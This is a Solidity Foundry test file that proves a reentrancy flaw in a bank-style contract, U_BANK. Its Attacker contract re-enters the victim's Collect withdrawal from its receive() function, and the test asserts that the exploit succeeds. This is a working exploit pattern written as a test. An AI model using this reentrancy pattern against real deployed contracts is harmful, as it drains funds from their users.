
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Log} from "../src/Log.sol";
import {U_BANK} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether);
        vm.assume(attackVal < type(uint128).max);

        uint256 initialVictimBalance = attackVal * 3;
        vm.deal(address(_contractUnderTest), initialVictimBalance);
        vm.deal(address(_attacker), attackVal);
        vm.deal(address(this), attackVal);

        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.warp(block.timestamp + 1 days);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        require(msg.value == val, "Incorrect ETH amount");
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        _victim.Put{value: val}(block.timestamp + 1);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.Collect(val);
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
